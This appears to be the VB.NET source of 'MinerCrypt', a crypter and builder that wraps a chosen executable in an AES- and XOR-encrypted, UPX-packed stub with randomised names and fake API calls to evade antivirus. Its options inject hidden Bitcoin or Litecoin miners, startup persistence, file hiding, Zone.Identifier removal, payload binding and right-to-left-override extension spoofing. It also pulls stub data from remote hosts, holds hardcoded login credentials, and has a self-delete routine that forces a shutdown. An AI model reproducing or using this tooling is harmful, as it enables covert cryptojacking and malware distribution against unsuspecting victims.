Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Text
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography

'Login: chiefkeef
'Pass: 5R6FT7G8YH945DCR
'664D0000


Public Class MinerCrypt
    'Inherits MaterialSkin.Controls.MaterialForm

    Public Shared ran As New Random
    Public Shared XorRan As Integer = ran.Next(6, 16)

    Sub New()

        'Seal.Catch = True
        'Seal.ValidateCore = True
        'Seal.Protection = RuntimeProtection.DebuggersEx Or
        'RuntimeProtection.Debuggers Or
        'RuntimeProtection.FullScan
        'Seal.RunHook = AddressOf RunHook
        'Seal.BanHook = AddressOf BanHook
        'Seal.Initialize("9E540000")

        'Seal.DisableUpdates = True
        'Seal.Catch = True
        'Seal.ValidateCore = True
        'Seal.RunHook = AddressOf RunHook
        'Seal.BanHook = AddressOf BanHook
        'Seal.Initialize("9E540000")

        InitializeComponent()

    End Sub

    Private Sub MainBrowse_Click(sender As Object, e As EventArgs) Handles MainBrowse.Click
        Dim ofd1 As New OpenFileDialog
        ofd1.Filter = "Executable | *.exe"
        If ofd1.ShowDialog = Windows.Forms.DialogResult.OK Then
            MainText.Text = ofd1.FileName
        End If
    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles IntensityTrack.Scroll
        IntensityText.Text = IntensityTrack.Value & "%"
    End Sub

    Dim SelectIcon As String
    Public Shared SaveLoc As String

    Private Sub BuildButton_Click(sender As Object, e As EventArgs) Handles BuildButton.Click
        Try

            If MainText.Text.Length > 0 Then
                Dim sfd1 As New SaveFileDialog
                sfd1.Filter = "Executable |*.exe"
                If sfd1.ShowDialog = Windows.Forms.DialogResult.OK Then
                    SaveLoc = sfd1.FileName

                    For ii As Integer = 1 To 5

                        For i As Integer = 0 To 4
                            XorRan = ran.Next(6, 16)
                            If Not XorRan = 10 Then
                                Exit For
                            End If
                        Next
                        System.Net.ServicePointManager.DefaultConnectionLimit = 500
                        Dim address As String = "http://hfsoft.xyz/text/Steb.txt"
                        Dim client As Net.WebClient = New Net.WebClient()
                        Dim reader As StreamReader = New StreamReader(client.OpenRead(address))

                        Dim address2 As String = "http://hfsoft.xyz/text/dell.txt"
                        Dim client2 As Net.WebClient = New Net.WebClient()
                        Dim reader2 As StreamReader = New StreamReader(client2.OpenRead(address2))

                        Dim address3 As String = "http://pastebin.com/raw.php?i=fLbvakRU"
                        Dim client3 As Net.WebClient = New Net.WebClient()
                        Dim reader3 As StreamReader = New StreamReader(client3.OpenRead(address3))

                        'Dim StubRes As String = reader.ReadToEnd
                        Dim StubRes As String = My.Resources.Stubres

                        'Dim DllRes As String = reader2.ReadToEnd
                        Dim DllRes As String = My.Resources.DllRes

                        Dim AssembRes As String = reader3.ReadToEnd

                        Dim vars As String() = {"Main_Module",
                                                "Var1",
                                                "IUDHJSFNuiSDHKFJDKUHFJS",
                                                "PX_Func_001_param_01",
                                                "PX_Func_001",
                                                "huUBBABUBSDFA", "hubba", "bubba"}

                        Dim dllvars As String() = {"RunPE",
                                                   "PIX_Func_002",
                                                   "Run2",
                                                   "Running",
                                                   "CMD_ADD_SUB",
                                                   "LTCGPU",
                                                   "BTCGPU",
                                                   "LTCCPU",
                                                   "BTCCPU",
                                                   "Unblock"}

                        Dim randdllvars As String() = {Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString,
                                                       Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString}

                        If ManagedRadio.Checked = True Then
                            StubRes = StubRes.Replace("RunPE.Running()", "RunPE.Run2()")
                        End If

                        DllRes = DllRes.Replace(dllvars(0), randdllvars(0))
                        DllRes = DllRes.Replace(dllvars(1), randdllvars(1))
                        DllRes = DllRes.Replace(dllvars(2), randdllvars(2))
                        DllRes = DllRes.Replace(dllvars(3), randdllvars(3))
                        DllRes = DllRes.Replace(dllvars(4), randdllvars(4))
                        DllRes = DllRes.Replace(dllvars(5), randdllvars(5))
                        DllRes = DllRes.Replace(dllvars(6), randdllvars(6))
                        DllRes = DllRes.Replace(dllvars(7), randdllvars(7))
                        DllRes = DllRes.Replace(dllvars(8), randdllvars(8))
                        DllRes = DllRes.Replace(dllvars(9), randdllvars(9))

                        dllvars(0) = randdllvars(0)
                        dllvars(1) = randdllvars(1)
                        dllvars(2) = randdllvars(2)
                        dllvars(3) = randdllvars(3)
                        dllvars(4) = randdllvars(4)
                        dllvars(5) = randdllvars(5)
                        dllvars(6) = randdllvars(6)
                        dllvars(7) = randdllvars(7)
                        dllvars(8) = randdllvars(8)
                        dllvars(9) = randdllvars(9)

                        If assembchk.Checked = True Then
                            StubRes = StubRes.Replace("'AssemblyInfo", AssembRes)
                        End If

                        If StartupCheck.Checked = True Then
                            If localappdataradio.Checked = False Then
                                DllRes = DllRes.Replace("'Startup", dllvars(4) & "(""" & StartupName.Text & """, Environ(""appdata"") & ""\" & StartupName.Text & ".exe"")")
                            Else
                                DllRes = DllRes.Replace("'Startup", dllvars(4) & "(""" & StartupName.Text & """, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & ""\" & StartupName.Text & ".exe"")")
                            End If

                        End If

                        If zoneidcheck.Checked = True Then
                            DllRes = DllRes.Replace("'ZoneID", dllvars(9) & "()")
                        End If

                        If ErrorMsgCheck.Checked = False Then
                            StubRes = StubRes.Replace("System.Windows.Forms.MessageBox.Show(IUDHJSFNuiSDHKFJDKUHFJS.ToString)", "")
                        End If

                        If HideFile.Checked = True Then
                            DllRes = DllRes.Replace("'hidefileatt", "File.SetAttributes(Process.GetCurrentProcess().MainModule.FileName, FileAttributes.Hidden)")
                        End If

                        If MinerEnable.Checked = True Then
                            If BitcoinRadio.Checked = True Then
                                If MinerGPU.Checked = True Then
                                    If HiddenWindowCheck.Checked = True Then
                                        If proxycheck.Checked = True Then
                                            If http.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(6) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""http://" & proxyurl.Text & """)")
                                            ElseIf socks4.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(6) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""socks4://" & proxyurl.Text & """)")
                                            ElseIf socks5.Checked Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(6) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""socks5://" & proxyurl.Text & ")""")
                                            End If
                                        Else
                                            DllRes = DllRes.Replace("'Miner", dllvars(6) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, """")")
                                        End If
                                    Else
                                        If proxycheck.Checked = True Then
                                            If http.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(6) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""http://" & proxyurl.Text & """)")
                                            ElseIf socks4.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(6) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""socks4://" & proxyurl.Text & """)")
                                            ElseIf socks5.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(6) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""socks5://" & proxyurl.Text & """)")
                                            End If
                                        Else
                                            DllRes = DllRes.Replace("'Miner", dllvars(6) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, """")")
                                        End If
                                    End If
                                Else
                                    If HiddenWindowCheck.Checked = True Then
                                        If proxycheck.Checked = True Then
                                            If http.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(8) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""http://" & proxyurl.Text & """)")
                                            ElseIf socks4.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(8) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""socks4://" & proxyurl.Text & """)")
                                            ElseIf socks5.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(8) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""socks5://" & proxyurl.Text & """)")
                                            End If
                                        Else
                                            DllRes = DllRes.Replace("'Miner", dllvars(8) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, """")")
                                        End If
                                    Else
                                        If proxycheck.Checked = True Then
                                            If http.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(8) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""http://" & proxyurl.Text & """)")
                                            ElseIf socks4.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(8) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""socks4://" & proxyurl.Text & """)")
                                            ElseIf socks5.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(8) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""socks5://" & proxyurl.Text & """)")
                                            End If
                                        Else
                                            DllRes = DllRes.Replace("'Miner", dllvars(8) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, """")")
                                        End If
                                    End If
                                End If
                            End If

                            If LitecoinRadio.Checked = True Then
                                If MinerGPU.Checked = True Then
                                    If HiddenWindowCheck.Checked = True Then
                                        If proxycheck.Checked = True Then
                                            If http.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(5) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""http://" & proxyurl.Text & """)")
                                            ElseIf socks4.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(5) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""socks4://" & proxyurl.Text & """)")
                                            ElseIf socks5.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(5) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""socks5://" & proxyurl.Text & """)")
                                            End If
                                        Else
                                            DllRes = DllRes.Replace("'Miner", dllvars(5) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True)")
                                        End If
                                    Else
                                        If proxycheck.Checked = True Then
                                            If http.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(5) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""http://" & proxyurl.Text & """)")
                                            ElseIf socks4.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(5) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""socks4://" & proxyurl.Text & """)")
                                            ElseIf socks5.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(5) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""socks5://" & proxyurl.Text & """)")
                                            End If
                                        Else
                                            DllRes = DllRes.Replace("'Miner", dllvars(5) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False)")
                                        End If
                                    End If
                                Else
                                    If HiddenWindowCheck.Checked = True Then

                                        If proxycheck.Checked = True Then
                                            If http.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(7) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""http://" & proxyurl.Text & """)")
                                            ElseIf socks4.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(7) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""socks4://" & proxyurl.Text & """)")
                                            ElseIf socks5.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(7) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True, ""socks5://" & proxyurl.Text & """)")
                                            End If
                                        Else
                                            DllRes = DllRes.Replace("'Miner", dllvars(7) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, True)")
                                        End If
                                    Else
                                        If proxycheck.Checked = True Then
                                            If http.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(7) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""http://" & proxyurl.Text & """)")
                                            ElseIf socks4.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(7) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""socks4://" & proxyurl.Text & """)")
                                            ElseIf socks5.Checked = True Then
                                                DllRes = DllRes.Replace("'Miner", dllvars(7) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False, ""socks5://" & proxyurl.Text & """)")
                                            End If
                                        Else
                                            DllRes = DllRes.Replace("'Miner", dllvars(7) & "(""" & MinerHost.Text & """, """ & MinerUser.Text & """, """ & MinerPass.Text & """, False)")
                                        End If
                                    End If
                                End If
                            End If

                        End If

                        If CustCodeChk.Checked = True Then
                            DllRes = DllRes.Replace("'customsub", CustCode.Text)
                            If aftedelaychk.Checked = True Then
                                DllRes = DllRes.Replace("'afterdelay", cuscall.Text)
                            Else
                                DllRes = DllRes.Replace("'beforedelay", cuscall.Text)
                            End If
                        End If

                        StubRes = StubRes.Replace("12983", XorRan)
                        DllRes = DllRes.Replace("12983", XorRan)

                        'If Seal.GetVariable("FAKEAPI") = "True" Then
                        '    If Seal.Username.Length < 1 Then
                        '        Application.Exit()
                        '    End If
                        For i As Integer = 1 To 4
                            StubRes = StubRes.Replace("'FakeApiHold" & i.ToString, Functions.CreateFakeAPI(25))
                        Next
                        'End If

                        StubRes = StubRes.Replace("//AssemblyTitle//", AssemblyTitle.Text) 'Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1) & Functions.RandomExtentionAssembly(1))
                        StubRes = StubRes.Replace("//AssemblyDescription//", AssemblyDescription.Text) 'Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1))
                        StubRes = StubRes.Replace("//AssemblyCompany//", AssemblyCompany.Text) 'Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1))
                        StubRes = StubRes.Replace("//AssemblyProduct//", AssemblyProduct.Text) 'Functions.RandomAssembly(1) & " ® " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1))
                        StubRes = StubRes.Replace("//AssemblyCopyright//", AssemblyCopyright.Text) 'Functions.RandomAssembly(1) & " © " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1))
                        StubRes = StubRes.Replace("//AssemblyTrademark//", AssemblyTrademark.Text) 'Functions.RandomAssembly(1) & " © " & Functions.RandomAssembly(1) & " " & Functions.RandomAssembly(1))
                        StubRes = StubRes.Replace("123.234.345.456", AssemblyN1.Text & "." & AssemblyN2.Text & "." & AssemblyN3.Text & "." & AssemblyN4.Text) 'ran.Next(1, 999) & "." & ran.Next(1, 999) & "." & ran.Next(1, 999) & "." & ran.Next(1, 999))
                        StubRes = StubRes.Replace("098.987.876.765", AssemblyN1.Text & "." & AssemblyN2.Text & "." & AssemblyN3.Text & "." & AssemblyN4.Text) 'ran.Next(1, 999) & "." & ran.Next(1, 999) & "." & ran.Next(1, 999) & "." & ran.Next(1, 999))

                        DllRes = DllRes.Replace("15000", (DelayValue.Value * 1000).ToString)

                        Dim ResName As String = Functions.Usg_ran(ran.Next(5, 10))

                        Dim DllName As String = Functions.Usg_ran(ran.Next(5, 10))

                        DllRes = DllRes.Replace("ResourceNameReplace", ResName)
                        StubRes = StubRes.Replace("DllResourceReplace", DllName)

                        StubRes = StubRes.Replace("RunPE", dllvars(0))
                        StubRes = StubRes.Replace("PIX_Func_002", dllvars(1))
                        StubRes = StubRes.Replace("Run2", dllvars(2))
                        StubRes = StubRes.Replace("Running", dllvars(3))
                        StubRes = StubRes.Replace("CMD_ADD_SUB", dllvars(4))
                        StubRes = StubRes.Replace("LTCGPU", dllvars(5))
                        StubRes = StubRes.Replace("BTCGPU", dllvars(6))
                        StubRes = StubRes.Replace("LTCCPU", dllvars(7))
                        StubRes = StubRes.Replace("BTCCPU", dllvars(8))
                        StubRes = StubRes.Replace("Unblock", dllvars(9))

                        StubRes = StubRes.Replace("Segoe UI Semibold", Functions.GenerateFont(ran.Next(0, 17)))
                        StubRes = StubRes.Replace("11.25", ran.Next(6, 16) & "." & ran.Next(ran.Next(1, 99)))
                        StubRes = StubRes.Replace("System.Drawing.FontStyle.Bold", Functions.GenerateFontType(ran.Next(0, 4)))
                        StubRes = StubRes.Replace("System.Drawing.GraphicsUnit.Point", Functions.GenerateFontMeasurement(ran.Next(0, 5)))

                        DllRes = DllRes.Replace("EncKey", EncKey.Text)

                        For i As Integer = 0 To vars.Length - 1
                            StubRes = StubRes.Replace(vars(i), Functions.Usg_ran(ran.Next(6, 18)) & "_" & Functions.Usg_ran(ran.Next(6, 16)) & ran.Next(1, 20).ToString)
                        Next

                        System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\UPX.exe", My.Resources.upx)
                        System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\ENC.exe", File.ReadAllBytes(MainText.Text))

                        Dim WRT_RG_Sub_001_var02 As ProcessStartInfo = New ProcessStartInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\UPX.exe", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\ENC.exe")
                        WRT_RG_Sub_001_var02.WindowStyle = ProcessWindowStyle.Hidden
                        Process.Start(WRT_RG_Sub_001_var02).WaitForExit(Int32.MaxValue)

                        Dim CompressedBytes As Byte() = System.IO.File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\ENC.exe")

                        Dim PixelByte As Byte() = AES.AES_Encrypt(Functions.Compress(CompressedBytes), EncKey.Text)

                        Dim XORByte As Byte() = ASDF(PixelByte, XorRan)

                        'Dim AESByte As Byte() = AES.AES_Encrypt(PixelByte, EncKey.Text)

                        Compiler.GenerateResource(Environ("appdata") & "\" & ResName & ".resources", ResName, XORByte)

                        If BinderEnable.Checked = True Then

                            Dim binderdata As String = String.Empty

                            For i As Integer = 0 To BinderView.Items.Count - 1

                                If BinderView.Items(i).SubItems(1).Text = "Always" Then
                                    binderdata &= " : " & "ByteArrayToFile(Environ(""appdata"") & ""\" & Path.GetFileName(BinderView.Items(i).SubItems(0).Text) & """, New System.Resources.ResourceManager(""binderres" & i & """, System.Reflection.Assembly.GetExecutingAssembly).GetObject(""binderres" & i & """), False, True)"

                                    Compiler.GenerateResource(Environ("appdata") & "\binderres" & i & ".resources", "binderres" & i, System.IO.File.ReadAllBytes(BinderView.Items(i).SubItems(0).Text))
                                ElseIf BinderView.Items(i).SubItems(1).Text = "Once" Then
                                    binderdata &= " : " & "ByteArrayToFile(Environ(""appdata"") & ""\" & Path.GetFileName(BinderView.Items(i).SubItems(0).Text) & """, New System.Resources.ResourceManager(""binderres" & i & """, System.Reflection.Assembly.GetExecutingAssembly).GetObject(""binderres" & i & """), True, True)"

                                    Compiler.GenerateResource(Environ("appdata") & "\binderres" & i & ".resources", "binderres" & i, System.IO.File.ReadAllBytes(BinderView.Items(i).SubItems(0).Text))
                                ElseIf BinderView.Items(i).SubItems(1).Text = "Never" Then
                                    binderdata &= " : " & "ByteArrayToFile(Environ(""appdata"") & ""\" & Path.GetFileName(BinderView.Items(i).SubItems(0).Text) & """, New System.Resources.ResourceManager(""binderres" & i & """, System.Reflection.Assembly.GetExecutingAssembly).GetObject(""binderres" & i & """), False, False)"

                                    Compiler.GenerateResource(Environ("appdata") & "\binderres" & i & ".resources", "binderres" & i, System.IO.File.ReadAllBytes(BinderView.Items(i).SubItems(0).Text))
                                End If
                            Next

                            DllRes = DllRes.Replace("'Binder", binderdata)

                        End If

                        Compiler.CompileDll(DllRes, Environ("appdata") & "\Dlllllllll.exe", Environ("appdata") & "\" & ResName & ".resources")

                        Compiler.GenerateResource(Environ("appdata") & "\" & DllName & ".resources", DllName, ASDF(File.ReadAllBytes(Environ("appdata") & "\Dlllllllll.exe"), XorRan))

                        StubRes = StubRes.Replace("876567875", ASDF(File.ReadAllBytes(Environ("appdata") & "\Dlllllllll.exe"), XorRan).Length)

                        Compiler.CompileAssembly(StubRes, Environ("appdata") & "\" & Path.GetFileName(sfd1.FileName), Environ("appdata") & "\" & DllName & ".resources")

                        Try : System.IO.File.Delete(Environ("appdata") & "\Icon.ico") : Catch : End Try

                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & ResName & ".resources")

                        File.Delete(Environ("appdata") & "\" & DllName & ".resources")

                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\UPX.exe")

                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\ENC.exe")

                        File.Delete(Environ("appdata") & "\Dlllllllll.exe")

                        If System.IO.File.Exists(Environ("appdata") & "\" & Path.GetFileName(sfd1.FileName)) Then
                            GoTo FINISHGOTO
                        End If

                    Next

FINISHGOTO:

                    If SelectIcon = Nothing Then
                        Dim derp As Bitmap
                        Dim herp As New IntPtr
                        Dim flerp As Icon

                        derp = Functions.Gen(x1.Text, y1.Text)
                        herp = derp.GetHicon
                        flerp = System.Drawing.Icon.FromHandle(herp)

                        Using fs As New IO.FileStream(Environ("appdata") & "\Icon.ico", IO.FileMode.Create)
                            flerp.Save(fs)
                            fs.Close()
                        End Using

                        IconChanger.InjectIcon(Environ("appdata") & "\" & Path.GetFileName(sfd1.FileName), Environ("appdata") & "\Icon.ico")

                    Else
                        IconChanger.InjectIcon(Environ("appdata") & "\" & Path.GetFileName(sfd1.FileName), SelectIcon)
                    End If

                    Dim Newpath As String

                    If extspoofcheck.Checked = True Then
                        Newpath = IO.Path.GetFileNameWithoutExtension(Environ("appdata") & "\" & Path.GetFileName(sfd1.FileName)) & ChrW(8238) & StrReverse(extspooftext.Text) & ".exe"
                        Invoke(New MethodInvoker(Sub()
                                                     My.Computer.FileSystem.RenameFile(Environ("appdata") & "\" & Path.GetFileName(sfd1.FileName), Newpath)
                                                 End Sub))
                    End If

                    System.IO.File.Move(Environ("appdata") & "\" & Path.GetFileName(sfd1.FileName), SaveLoc)

                    MessageBox.Show("File Built!")

                End If

            Else
                MessageBox.Show("You haven't chosen a file!")
            End If
        Catch ex As Exception
            MessageBox.Show(ex.ToString)
        End Try
    End Sub

    Public Shared Function ASDF(buffer1 As Byte(), buffer2 As Integer) As Byte()

        For i As Integer = 0 To buffer1.Length - 1 Step buffer2
            buffer1(i) = CByte(buffer1(i) Xor buffer2)
        Next

        Return buffer1
    End Function

#Region "Seal Stuff"

    Private Sub RunHook()
        For Each clsProcess As Process In Process.GetProcesses()
            If clsProcess.ProcessName.StartsWith("ekrn") Or clsProcess.ProcessName.StartsWith("egui") Then
                MessageBox.Show("Please uninstall ESET!")
                End
            End If
        Next
    End Sub

    Private Sub BanHook()

        Dim FileName As String = Seal.ExecutablePath
        Dim Success As Boolean = MoveFileEx(FileName, Nothing, 4)

        Dim Name As String = Path.GetFileName(FileName)
        Dim C1 As String = "taskkill /f /im"
        Dim C2 As String = "ping -n 1 -w 3000 1.1.1.1"
        Dim C3 As String = "type nul >"
        Dim C4 As String = "del /f /q"

        Dim CMD As String = String.Format("/C {0} ""{4}"" & {1} & {2} ""{5}"" & {3} ""{5}""", C1, C2, C3, C4, Name, FileName)

        Dim PI As New ProcessStartInfo("cmd.exe", CMD)
        PI.WindowStyle = ProcessWindowStyle.Hidden

        Process.Start(PI).WaitForExit(3500)
        'If CMD fails the code below will be executed.

        If Success Then
            Dim Token As IntPtr
            Dim Handle As IntPtr = Process.GetCurrentProcess.Handle

            If Not OpenToken(Handle, 40, Token) Then Return

            Dim TP As TokenPrivilege
            TP.Count = 1
            TP.Flags = 2

            If Not GetPrivilegeID(Nothing, "SeShutdownPrivilege", TP.LUID) Then Return
            If Not SetPrivilege(Token, False, TP, 0, IntPtr.Zero, IntPtr.Zero) Then Return
            ShutdownEx(Nothing, Nothing, 0, True, True, 327699)
        End If
    End Sub

#Region " Win32 Calls "

    <DllImport("kernel32.dll", EntryPoint:="MoveFileEx")> _
    Private Shared Function MoveFileEx( _
ByVal fileName As String, _
ByVal newName As String, _
ByVal flags As UInteger) As Boolean
    End Function

    <DllImport("advapi32.dll", EntryPoint:="OpenProcessToken")> _
    Private Shared Function OpenToken( _
ByVal handle As IntPtr, _
ByVal access As UInteger, _
ByRef token As IntPtr) As Boolean
    End Function

    <DllImport("advapi32.dll", EntryPoint:="LookupPrivilegeValue")> _
    Private Shared Function GetPrivilegeID( _
ByVal machine As String, _
ByVal name As String, _
ByRef luid As Long) As Boolean
    End Function

    <DllImport("advapi32.dll", EntryPoint:="AdjustTokenPrivileges")> _
    Private Shared Function SetPrivilege( _
ByVal token As IntPtr, _
ByVal release As Boolean, _
ByRef newState As TokenPrivilege, _
ByVal zero1 As UInteger, _
ByVal zero2 As IntPtr, _
ByVal zero3 As IntPtr) As Boolean
    End Function

    <DllImport("advapi32.dll", EntryPoint:="InitiateSystemShutdownEx")> _
    Private Shared Function ShutdownEx( _
ByVal machine As String, _
ByVal message As String, _
ByVal timeout As UInteger, _
ByVal force As Boolean, _
ByVal reboot As Boolean, _
ByVal reason As UInteger) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential, Pack:=1)> _
    Private Structure TokenPrivilege
        Public Count As UInteger
        Public LUID As Long
        Public Flags As UInteger
    End Structure

#End Region

#End Region

    Private Sub RandomPool1_CharacterSelection(s As Object, c As Char) Handles RandomPool1.CharacterSelection
        If EncKey.Text.Length < 90 Then
            EncKey.Text += c
        End If
    End Sub

    Private Sub MinerEnable_CheckedChanged(sender As Object) Handles MinerEnable.CheckedChanged
        If MinerEnable.Checked = True Then
            InstructionLabel.Enabled = True
            MinerHost.Enabled = True
            MinerUser.Enabled = True
            MinerPass.Enabled = True
            BitcoinRadio.Enabled = True
            LitecoinRadio.Enabled = True
            HiddenWindowCheck.Enabled = True
            MinerGPU.Enabled = True
            proxycheck.Enabled = True
        Else
            InstructionLabel.Enabled = False
            MinerHost.Enabled = False
            MinerUser.Enabled = False
            MinerPass.Enabled = False
            BitcoinRadio.Enabled = False
            LitecoinRadio.Enabled = False
            HiddenWindowCheck.Enabled = False
            MinerGPU.Enabled = False
            proxycheck.Enabled = False
        End If
    End Sub

    Private Sub StartupCheck_CheckedChanged(sender As Object) Handles StartupCheck.CheckedChanged
        If StartupCheck.Checked = True Then
            localappdataradio.Enabled = True
            StartupName.Enabled = True
        Else
            StartupName.Enabled = False
            localappdataradio.Enabled = False
        End If
    End Sub

    Private Sub IcoBrowse_Click(sender As Object, e As EventArgs) Handles IcoBrowse.Click

        Dim ofd As New OpenFileDialog
        ofd.Filter = "Icons|*.ico"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            IconBox.Image = System.Drawing.Image.FromFile(ofd.FileName)
            SelectIcon = ofd.FileName
        End If

    End Sub

    Private Sub MinerCrypt_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        IconBox.Image = Functions.Gen(x1.Text, y1.Text)

        Dim address As String = "http://hfsoft.xyz/text/assembly.txt"
        Dim client As Net.WebClient = New Net.WebClient()
        Dim reader As StreamReader = New StreamReader(client.OpenRead(address))

        AssemblyTitle.Text = reader.ReadLine
        AssemblyDescription.Text = reader.ReadLine
        AssemblyCompany.Text = reader.ReadLine
        AssemblyProduct.Text = reader.ReadLine
        AssemblyCopyright.Text = reader.ReadLine
        AssemblyTrademark.Text = reader.ReadLine

        AssemblyN1.Text = reader.ReadLine
        AssemblyN2.Text = reader.ReadLine
        AssemblyN3.Text = reader.ReadLine
        AssemblyN4.Text = reader.ReadLine

        tostext.Text = "No leaking, no sharing of accounts, no virustotal or any other side that distributes, no uploading sites that distribute (bluefile.net should be good). Used for legal, educational purposes only. We will not be held responsible if you decide to go ahead with that decision. You know the deal HF"
